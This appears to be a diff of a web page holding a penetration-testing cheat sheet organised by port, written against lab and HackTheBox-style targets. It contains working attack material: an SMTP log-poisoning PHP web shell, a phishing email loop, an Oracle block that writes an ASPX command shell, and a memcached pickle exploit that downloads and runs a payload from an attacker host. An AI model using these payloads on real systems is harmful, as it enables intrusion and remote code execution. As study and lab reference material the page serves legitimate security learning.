@@ -17,7 +17,7 @@ layout: default
     <h2><a id="portscan">Port Scanning</a></h2>
     
     <h4>Nmap</h4>
-
+    
     <li>Basic strategy</li>
     <table>
         <tr>
@@ -50,7 +50,7 @@ layout: default
             <td>sudo nmap -sV -sC -sU -p&lt;comma separated list of open ports&gt;</td>
         </tr>
     </table>
-
+    
     <ul>
         <li>Running scan with -sV and -sC at the same time or each separately can give different responses in some cases.</li>
         <li>If UDP shows open|filtered then run scripts with -sC.  This will be more likely to get a response from the port to confirm if it is open or not.  Sometimes open ports only show up while using -sT (rare.  Maybe only an ISAKMP/ipsec issue?)</li>
@@ -118,19 +118,12 @@ layout: default
     <table>
         <tr>Bash script for port scanning</tr>
         <tr>
-            <pre>
-                #!/bin/bash host=10.5.5.11
-                for port in {1..65535}; do
-                timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
-                echo "port $port is open"
-                done
-                echo "Done"
-            </pre>
+            <pre>&#13;&#10;#!/bin/bash host=10.5.5.11&#13;&#10;for port in {1..65535}; do&#13;&#10;timeout .1 bash -c &quot;echo &gt;/dev/tcp/$host/$port&quot; &amp;&amp;&#13;&#10;echo &quot;port $port is open&quot;&#13;&#10;done&#13;&#10;echo &quot;Done&quot;&#13;&#10;            </pre>
         </tr>
     </table>
     
     <p>Massscan - Possbily the fastest port scanner.</p>
-
+    
     <hr>
     
     <h2>21 TCP / FTP</h2>
@@ -203,7 +196,7 @@ layout: default
             </ul>
         </li>
     </ul>
-
+    
     <hr>
     
     <h2>22 TCP / SSH</h2>
@@ -240,7 +233,7 @@ layout: default
             <td>-oPubkeyAcceptedKeyTypes=+&lt;key type - example: ssh-dss&gt;</td>
         </tr>
     </table>
-
+    
     <hr>
     
     <h2>25 TCP / SMTP</h2>
@@ -263,28 +256,7 @@ layout: default
             <li>Sends mail</li>
             <li>On internal networks you can typically send emails as anybody</li>
             <li>SMTP poisoning
-                <pre>
-telnet 10.0.0.12 25
-Trying 10.0.0.12...
-Connected to 10.0.0.12.
-Escape character is &#039;^]&#039;.
-220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
-HELO example.com
-250 symfonos.localdomain
-mail from: hacker@example.com
-250 2.1.0 Ok
-rcpt to: helios@symfonos.localdomain
-250 2.1.5 Ok
-data
-354 End data with &amp;lt;CR&amp;gt;&amp;lt;F&amp;gt;.&amp;lt;CR&amp;gt;&amp;lt;LF&amp;gt;
-subject: 
-&amp;lt;?php echo shell_exec($_GET[&#039;cmd&#039;]); ?&amp;gt;
-.
-250 2.0.0 Ok: queued as 8A6884082B
-quit
-221 2.0.0 Bye
-Connection closed by foreign host.
-                </pre>
+                <pre>&#13;&#10;telnet 10.0.0.12 25&#13;&#10;Trying 10.0.0.12...&#13;&#10;Connected to 10.0.0.12.&#13;&#10;Escape character is &apos;^]&apos;.&#13;&#10;220 symfonos.localdomain ESMTP Postfix (Debian/GNU)&#13;&#10;HELO example.com&#13;&#10;250 symfonos.localdomain&#13;&#10;mail from: hacker@example.com&#13;&#10;250 2.1.0 Ok&#13;&#10;rcpt to: helios@symfonos.localdomain&#13;&#10;250 2.1.5 Ok&#13;&#10;data&#13;&#10;354 End data with &lt;CR&gt;&lt;F&gt;.&lt;CR&gt;&lt;LF&gt;&#13;&#10;subject: &#13;&#10;&lt;?php echo shell_exec($_GET[&apos;cmd&apos;]); ?&gt;&#13;&#10;.&#13;&#10;250 2.0.0 Ok: queued as 8A6884082B&#13;&#10;quit&#13;&#10;221 2.0.0 Bye&#13;&#10;Connection closed by foreign host.&#13;&#10;                </pre>
             </li>
             <li>LFI - /var/mail/&lt;username&gt;?cmd=&lt;command&gt;</li>
         </ul>
@@ -317,17 +289,7 @@ Connection closed by foreign host.
                         <tr>
                             <tr>Bash script to send emails to a list</tr>
                             <tr>
-                                <pre>
-for email in $(cat email.lst);
-do
-swaks \
---from support@sneakymailer.htb \
---to $email \
---header 'Subject: Please Register Your Account' \
---body 'http://10.10.14.106/test' \
---server sneakymailer.htb
-done;
-                                </pre>
+                                <pre>&#13;&#10;for email in $(cat email.lst);&#13;&#10;do&#13;&#10;swaks \&#13;&#10;--from support@sneakymailer.htb \&#13;&#10;--to $email \&#13;&#10;--header &apos;Subject: Please Register Your Account&apos; \&#13;&#10;--body &apos;http://10.10.14.106/test&apos; \&#13;&#10;--server sneakymailer.htb&#13;&#10;done;&#13;&#10;                                </pre>
                             </tr>
                         </tr>
                     </table>
@@ -346,7 +308,7 @@ done;
             <li>Alt+F2</li>
         </ul>
     </li>
-
+    
     <hr>
     
     <h2>53 TCP / DNS</h2>
@@ -456,7 +418,7 @@ done;
             </tr>
         </table>
     </ul>
-
+    
     <hr>
     
     <h2>69 UDP / TFTP</h2>
@@ -465,26 +427,22 @@ done;
         <li>No command to list files</li>
         <li>Mostly the same commands as FTP</li>
     </ul>
-
+    
     <hr>
-
+    
     <h2>79 TCP / finger</h2>
-
+    
     <ul>
         <li>A service that provides information about users.  Can provide information such as full name, login time, phone number, email last sent, maybe file information.</li>
         <li>Connect with netcat</li>
         <ul>
             <li>Enter a username and if it exists, it will return with details on the user.</li>
-            <pre>
-$ nc -nv 192.168.108.140 79                      130 &Cross;&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Connected to 192.168.108.140:79.&#13;&#10;charlotte&#13;&#10;Login: charlotte         Name: Charlotte&#13;&#10;&#13;&#10;[No profile information]
-            </pre>
+            <pre>&#13;&#10;$ nc -nv 192.168.108.140 79                      130 &Cross;&#13;&#10;Ncat: Version 7.91 ( https://nmap.org/ncat )&#13;&#10;Ncat: Connected to 192.168.108.140:79.&#13;&#10;charlotte&#13;&#10;Login: charlotte         Name: Charlotte&#13;&#10;&#13;&#10;[No profile information]&#13;&#10;            </pre>
         </ul>
         <li>Running finger on local machine</li>
-        <pre>
-$ finger                                         127 &Cross;&#13;&#10;Login     Name       Tty      Idle  Login Time   Office     Office Phone&#13;&#10;kali      Kali       tty7     1:21  Sep 29 14:21 (:0)
-        </pre>
+        <pre>&#13;&#10;$ finger                                         127 &Cross;&#13;&#10;Login     Name       Tty      Idle  Login Time   Office     Office Phone&#13;&#10;kali      Kali       tty7     1:21  Sep 29 14:21 (:0)&#13;&#10;        </pre>
     </ul>
-
+    
     <hr>
     
     <h2>80 TCP / HTTP</h2>
@@ -525,7 +483,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             </ul>
         </li>
     </ul>
-
+    
     <hr>
     
     <h2>88 TCP / Kerberos</h2>
@@ -593,7 +551,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
     
     <li>Good article on Kerberose attacking: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting</li>
     <br>
-
+    
     <hr>
     
     <h2>110 TCP / POP3</h2>
@@ -633,7 +591,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             <td>RETR &lt;email # from LIST&gt;</td>
         </tr>
     </table>
-
+    
     <hr>
     
     <h2>111 TCP / rpcbind / NFS</h2>
@@ -714,7 +672,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             </table></td>
         </tr>
     </table>
-
+    
     <hr>
     
     <h2>113 TCP / ident</h2>
@@ -725,7 +683,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             <li>By default nmap -sC will enumerate every use of every running port</li>
         </ul>
     </ul>
-
+    
     <hr>
     
     <h2>119 TCP / NNTP</h2>
@@ -757,7 +715,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             </table>
         </ul>
     </ul>
-
+    
     <hr>
     
     <h2>135 TCP / msrpc</h2>
@@ -799,7 +757,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             <li>/auxiliary/scanner/dcerpc/hidden</li>
         </ul>
     </ul>
-
+    
     <hr>
     
     <h2>139 TCP / Netbios</h2>
@@ -912,7 +870,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             </table>
         </ul>
     </ul>
-
+    
     <hr>
     
     <h2>143 TCP / IMAP</h2>
@@ -967,7 +925,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             <td>A1 LOGOUT</td>
         </tr>
     </table>
-
+    
     <hr>
     
     <h2>161 UDP / SNMP</h2>
@@ -1027,7 +985,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             </table>
         </ul>
     </ul>
-
+    
     <hr>
     
     <h2>389 TCP / LDAP</h2>
@@ -1164,16 +1122,16 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             </table>
         </ul>
     </ul>
-
+    
     <hr>
     
     <h2>443 TCP / HTTPS</h2>
     
     <li>Secure version of port 80.  Most of the same things apply</li>
     <li>Check certificate for any interesting information</li>
-
+    
     <hr>
-
+    
     <h2>445 TCP / SMB</h2>
     
     <li>SMB is the protocol, CIFS is an old dialect of SMB, and my is the Linux/Unix-like implementation of the SMB protocol.</li>
@@ -1451,16 +1409,16 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             <td>Windows 8 SMB3 version. (mostly the same as SMB2_24)</td>
         </tr>
     </table>
-
+    
     <li>impacket-smbclient</li>
-
+    
     <hr>
     
     <h2>464 TCP / kpasswd5</h2>
     <li>Used for changing/setting passwords against Active Directory.</li>
-
+    
     <hr>
-
+    
     <h2>500 UDP / ISAKMP</h2>
     <li>Used for Internet Key Exchange (IKE)</li>
     <li>nmap can only scan open TCP ports through IPSEC VPN using -sT (connect scan?)</li>
@@ -1527,86 +1485,41 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
                 <table>
                     <tr>
                         <td>Fields Explained</td>
-                        <td><pre>
-                            # This file holds shared secrets or RSA private keys for authentication.
-                            %any : &lt;Authentication Type - Example: PSK&gt; &quot;&lt;VPN Password&gt;&quot;
-                        </pre></td>
+                        <td>
+                            <pre>&#13;&#10;# This file holds shared secrets or RSA private keys for authentication.&#13;&#10;%any : &lt;Authentication Type - Example: PSK&gt; &quot;&lt;VPN Password&gt;&quot;&#13;&#10;                        </pre>
+                        </td>
                     </tr>
                     <tr>
                         <td>Example file</td>
-                        <td><pre>
-                            # This file holds shared secrets or RSA private keys for authentication.
-                            
-                            %any : PSK "Dudecake1!"
-                        </pre></td>
+                        <td>
+                            <pre>&#13;&#10;# This file holds shared secrets or RSA private keys for authentication.&#13;&#10;&#13;&#10;%any : PSK &quot;Dudecake1!&quot;&#13;&#10;                        </pre>
+                        </td>
                     </tr>
                 </table>
                 <li>/etc/ipsec.conf</li>
                 <table>
                     <tr>
                         <td>Fields Explained</td>
-                        <td><pre>
-                            # ipsec.conf - strongSwan IPsec configuration file
-                            config setup
-                            charondebug="all"
-                            # More verbose for troubleshooting connection
-                            
-                            uniqueids=yes
-                            strictcrlpolicy=no
-                            conn conceal
-                            authby=secret
-                            # Auth type.  PSK = secret
-                            
-                            auto=add
-                            ike=&lt;Value 1&gt;-&lt;Value 2&gt;-&lt;Value 3&gt;!
-                            # ike-scan values: Enc=&lt;Value 1&gt;; Hash=&lt;Value 2&gt;; Group=2:&lt;value 3&gt;
-                            
-                            esp=&lt;Value 1&gt;-&lt;Value 2&gt;!
-                            # ike-scan values: Enc=&lt;Value 1&gt;; Hash=&lt;Value 2&gt;
-                            
-                            type=transport
-                            # ipsec transport mode
-                            
-                            keyexchange=ikev1
-                            # ike-scan value: (IKE CGA version 1) = ikev1
-                            
-                            left=&lt;Local Machine IP&gt;
-                            right=&lt;Remote Machine IP&gt;
-                            rightsubnet=&lt;Remote Machine IP&gt;[tcp]
-                        </pre></td>
+                        <td>
+                            <pre>&#13;&#10;# ipsec.conf - strongSwan IPsec configuration file&#13;&#10;config setup&#13;&#10;    charondebug=&quot;all&quot;&#13;&#10;# More verbose for troubleshooting connection&#13;&#10;&#13;&#10;    uniqueids=yes&#13;&#10;    strictcrlpolicy=no&#13;&#10;conn conceal&#13;&#10;    authby=secret&#13;&#10;# Auth type.  PSK = secret&#13;&#10;&#13;&#10;    auto=add&#13;&#10;    ike=&lt;Value 1&gt;-&lt;Value 2&gt;-&lt;Value 3&gt;!&#13;&#10;# ike-scan values: Enc=&lt;Value 1&gt;; Hash=&lt;Value 2&gt;; Group=2:&lt;value 3&gt;&#13;&#10;&#13;&#10;    esp=&lt;Value 1&gt;-&lt;Value 2&gt;!&#13;&#10;# ike-scan values: Enc=&lt;Value 1&gt;; Hash=&lt;Value 2&gt;&#13;&#10;&#13;&#10;    type=transport&#13;&#10;# ipsec transport mode&#13;&#10;&#13;&#10;    keyexchange=ikev1&#13;&#10;# ike-scan value: (IKE CGA version 1) = ikev1&#13;&#10;&#13;&#10;    left=&lt;Local Machine IP&gt;&#13;&#10;    right=&lt;Remote Machine IP&gt;&#13;&#10;    rightsubnet=&lt;Remote Machine IP&gt;[tcp]                            &#13;&#10;                        </pre>
+                        </td>
                     </tr>
                     <tr>
                         <td>Example File</td>
-                        <td><pre>
-                            # ipsec.conf - strongSwan IPsec configuration file
-                            
-                            config setup
-                            charondebug="all"
-                            uniqueids=yes
-                            strictcrlpolicy=no
-                            
-                            conn conceal
-                            authby=secret
-                            auto=add
-                            ike=3des-sha1-modp1024!
-                            esp=3des-sha1!
-                            type=transport
-                            keyexchange=ikev1
-                            left=10.10.14.6
-                            right=10.10.10.116
-                            rightsubnet=10.10.10.116[tcp]
-                        </pre></td>
+                        <td>
+                            <pre>&#13;&#10;# ipsec.conf - strongSwan IPsec configuration file&#13;&#10;&#13;&#10;config setup&#13;&#10;    charondebug=&quot;all&quot;&#13;&#10;    uniqueids=yes&#13;&#10;    strictcrlpolicy=no&#13;&#10;&#13;&#10;conn conceal&#13;&#10;    authby=secret&#13;&#10;    auto=add&#13;&#10;    ike=3des-sha1-modp1024!&#13;&#10;    esp=3des-sha1!&#13;&#10;    type=transport&#13;&#10;    keyexchange=ikev1&#13;&#10;    left=10.10.14.6&#13;&#10;    right=10.10.10.116&#13;&#10;    rightsubnet=10.10.10.116[tcp]&#13;&#10;                        </pre>
+                        </td>
                     </tr>
                 </table>
             </ul>
         </ul>
     </ul>
-
+    
     <hr>
     
     <h2>636 TCP / LDAPS</h2>
     <li>LDAP SSL connection</li>
-
+    
     <hr>
     
     <h2>837 TCP / rsync</h2>
@@ -1649,13 +1562,13 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             <td>rync -a -e "ssh -p &lt;port #&gt;" &lt;local directory&gt; &lt;user&gt;@&lt;ip address&gt;:&lt;directory&gt;</td>
         </tr>
     </table>
-
+    
     <hr>
     
     <h2>1025 TCP / msrpc</h2>
-
+    
     <hr>
-
+    
     <h2>1433 TCP / Microsoft SQL</h2>
     <li>Good resource: http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</li>
     <li>Retrieve mssql service's password using smb</li>
@@ -1699,12 +1612,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
     <li>sqsh</li>
     <ul>
         <li>append server to /etc/freetds/freetds.config</li>
-        <pre>
-            [&lt;hostname&gt;]
-            host = &lt;ip address&gt;
-            port = &lt;port #&gt;
-            tds version = &lt;Examples: 5.0, 7.3, 8.0&gt;
-        </pre>
+        <pre>&#13;&#10;[&lt;hostname&gt;]&#13;&#10;host = &lt;ip address&gt;&#13;&#10;port = &lt;port #&gt;&#13;&#10;tds version = &lt;Examples: 5.0, 7.3, 8.0&gt;&#13;&#10;        </pre>
         <li>Commands</li>
         <table>
             <tr>
@@ -1760,7 +1668,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             <td>SELECT * FROM fn_my_permissions(NULL, 'SERVER');</td>
         </tr>
     </table>
-
+    
     <hr>
     
     <h2>1521 TCP / Oracle TNS Listener</h2>
@@ -1863,18 +1771,9 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             <li>sed -z 's/\n//g' &lt;file&gt;</li>
         </ul>
         <li>aspx web shell example:</li>
-        <pre>
-            declare
-            f utl_file.file_type;
-            s varchar(5000) := &#039;&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;&lt;script Language=&quot;c#&quot; runat=&quot;server&quot;&gt;void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = &quot;cmd.exe&quot;;psi.Arguments = &quot;/c &quot;+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write(&quot;&lt;pre&gt;&quot;);Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(&quot;&lt;/pre&gt;&quot;);}&lt;/script&gt;&lt;HTML&gt;&lt;body &gt;&lt;form id=&quot;cmd&quot; method=&quot;post&quot; runat=&quot;server&quot;&gt;&lt;asp:TextBox id=&quot;txtArg&quot; runat=&quot;server&quot; Width=&quot;250px&quot;&gt;&lt;/asp:TextBox&gt;&lt;asp:Button id=&quot;testing&quot; runat=&quot;server&quot; Text=&quot;excute&quot; OnClick=&quot;cmdExe_Click&quot;&gt;&lt;/asp:Button&gt;&lt;asp:Label id=&quot;lblText&quot; runat=&quot;server&quot;&gt;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;&#039;;
-            begin
-            f := utl_file.fopen(&#039;/inetpub/wwwroot&#039;, &#039;shell.aspx&#039;, &#039;W&#039;);
-            utl_file.put_line(f,s);
-            utl_file.fclose(f);
-            end;
-        </pre>
+        <pre>&#13;&#10;declare&#13;&#10;f utl_file.file_type;&#13;&#10;s varchar(5000) := &apos;&lt;%@ Page Language=&quot;C#&quot; Debug=&quot;true&quot; Trace=&quot;false&quot; %&gt;&lt;%@ Import Namespace=&quot;System.Diagnostics&quot; %&gt;&lt;%@ Import Namespace=&quot;System.IO&quot; %&gt;&lt;script Language=&quot;c#&quot; runat=&quot;server&quot;&gt;void Page_Load(object sender, EventArgs e){}string ExcuteCmd(string arg){ProcessStartInfo psi = new ProcessStartInfo();psi.FileName = &quot;cmd.exe&quot;;psi.Arguments = &quot;/c &quot;+arg;psi.RedirectStandardOutput = true;psi.UseShellExecute = false;Process p = Process.Start(psi);StreamReader stmrdr = p.StandardOutput;string s = stmrdr.ReadToEnd();stmrdr.Close();return s;}void cmdExe_Click(object sender, System.EventArgs e){Response.Write(&quot;&lt;pre&gt;&quot;);Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));Response.Write(&quot;&lt;/pre&gt;&quot;);}&lt;/script&gt;&lt;HTML&gt;&lt;body &gt;&lt;form id=&quot;cmd&quot; method=&quot;post&quot; runat=&quot;server&quot;&gt;&lt;asp:TextBox id=&quot;txtArg&quot; runat=&quot;server&quot; Width=&quot;250px&quot;&gt;&lt;/asp:TextBox&gt;&lt;asp:Button id=&quot;testing&quot; runat=&quot;server&quot; Text=&quot;excute&quot; OnClick=&quot;cmdExe_Click&quot;&gt;&lt;/asp:Button&gt;&lt;asp:Label id=&quot;lblText&quot; runat=&quot;server&quot;&gt;Command:&lt;/asp:Label&gt;&lt;/form&gt;&lt;/body&gt;&lt;/HTML&gt;&apos;;&#13;&#10;begin&#13;&#10;f := utl_file.fopen(&apos;/inetpub/wwwroot&apos;, &apos;shell.aspx&apos;, &apos;W&apos;);&#13;&#10;utl_file.put_line(f,s);&#13;&#10;utl_file.fclose(f);&#13;&#10;end;&#13;&#10;        </pre>
     </ul>
-
+    
     <hr>
     
     <h2>2049 TCP / mountd (NFS)</h2>
@@ -1893,7 +1792,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             <td>mount -t nfs &lt;ip address&gt;:&lt;nfs share&gt;  &lt;local directory to mount to - Example: /mnt/&gt;</td>
         </tr>
     </table>
-
+    
     <hr>
     
     <h2>3000 TCP / Express.js Node</h2>
@@ -1902,25 +1801,25 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
         <li>Big data storage solution</li>
         <li>Data analytics & Data science</li>
     </ul>
-
+    
     <hr>
     
     <h2>3268 TCP / LDAP</h2>
     <li>LDAP connection to Global Catalog instead of the local DC which port 389 will return information for</li>
     <li>LDAP requests sent to port 3268 can be used to search for objects in the entire forest.</li>
     <li>Only the attributes marked for replication to the global catalog can be returned.</li>
-
+    
     <hr>
-
+    
     <h2>3269 TCP / LDAPS</h2>
     <li>LDAP connection to Global Catalog over SSL.</li>
-
+    
     <hr>
-
+    
     <h2>3306 TCP / MySql</h2>
-
+    
     <li>Connect to a mysql database</li>
-
+    
     <ul>
         <li>impacket-mssqlclient username:password@ip.address</li>
         <li>mysql --host=&lt;ip address&gt; --port=&lt;port&gt; --user=&lt;username&gt; -p&lt;password (no space after -p)&gt;</li>
@@ -1933,7 +1832,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
         <li>Allows administrators to create custom repeatable functions to accomplish specific objectives</li>
         <li>Written in C or C++ and will run almost any code including system commands</li>
     </ul>
-
+    
     <table>
         <tr>
             <td>Show variables</td>
@@ -2042,7 +1941,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
     </table>
     
     <li>Good resource: https://www.w3schools.com/sql/</li>
-
+    
     <hr>
     
     <h2>3389 TCP / RDP</h2>
@@ -2053,7 +1952,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             <td>rdesktop -g 100%@150</td>
         </tr>
     </table>
-
+    
     <hr>
     
     <h2>3690 TCP / SVN</h2>
@@ -2075,11 +1974,11 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             <td>svn up -&lt;revision from log&gt;</td>
         </tr>
     </table>
-
+    
     <hr>
     
     <h2>5432 TCP Postgresql</h2>
-
+    
     <li>Default credentials are</li>
     <ul>
         <li>Username: postgres</li>
@@ -2166,15 +2065,15 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             <td>SELECT * FROM cmd_exec;</td>
         </tr>
     </table>
-
+    
     <hr>
     
     <h2>5985 TCP / Microsoft HTTPAPI</h2>
-
+    
     <hr>
     
     <h2>5985 TCP / WinRM</h2>
-
+    
     <li>Windows remote management</li>
     <ul>
         <li>Can log into a remote shell using user credentials</li>
@@ -2211,11 +2110,11 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             </tr>
         </table>
     </ul>
-
+    
     <hr>
     
     <h2>6379 TCP / redis</h2>
-
+    
     <li>Key store / value storage</li>
     <li>RCE Methods:</li>
     <ul>
@@ -2284,7 +2183,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             </tr>
         </table>
     </ul>
-
+    
     <hr>
     
     <h2>6667 TCP / irc</h2>
@@ -2295,7 +2194,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             <li>gui irc client</li>
         </ul>
     </ul>
-
+    
     <hr>
     
     <h2>6697 TCP / irc</h2>
@@ -2322,7 +2221,7 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
             <td>db.tasks.insert({"cmd&quot;:&quot;&lt;bash command&gt;&quot;})</td>
         </tr>
     </table>
-
+    
     <hr>
     
     <h2>11211 TCP / memcache</h2>
@@ -2366,25 +2265,13 @@ $ finger                                         127 &Cross;&#13;&#10;Login     
         </tr>
     </table>
     
-    <li>RCE -python pickling</li>
+    <li>RCE - python pickling</li>
     <ul>
         <li>pip install pymemcache</li>
         <li>Generate malicious pickled python object to poison memcached object</li>
         <ul>
             <li>Script:</li>
-            <pre>
-                import pickle
-                import os
-                import sys
-                from pymemcache.client import base
-                class RCE:
-                def __reduce__(self):
-                cmd = (&#039;wget http://{}:5000/shell -O /tmp/shell &amp;&amp; chmod 777 /tmp/shell &amp;&amp; /tmp/shell&#039;.format(sys.argv[1]))
-                return os.system, (cmd,)
-                if __name__ == &#039;__main__&#039;:
-                client = base.Client((sys.argv[2], 11211))
-                client.set(sys.argv[3], pickle.dumps(RCE()))
-            </pre>
+            <pre>&#13;&#10;import pickle&#13;&#10;import os&#13;&#10;import sys&#13;&#10;from pymemcache.client import base&#13;&#10;class RCE:&#13;&#10;    def __reduce__(self):&#13;&#10;        cmd = (&apos;wget http://{}:5000/shell -O /tmp/shell &amp;&amp; chmod 777 /tmp/shell &amp;&amp; /tmp/shell&apos;.format(sys.argv[1]))&#13;&#10;        return os.system, (cmd,)&#13;&#10;if __name__ == &apos;__main__&apos;:&#13;&#10;    client = base.Client((sys.argv[2], 11211))&#13;&#10;    client.set(sys.argv[3], pickle.dumps(RCE()))                &#13;&#10;            </pre>
         </ul>
         <li>python exploit.py &lt;attacker ip&gt; &lt;memcache server ip&gt; &lt;session:&lt;value&gt;&gt;</li>
         <ul>
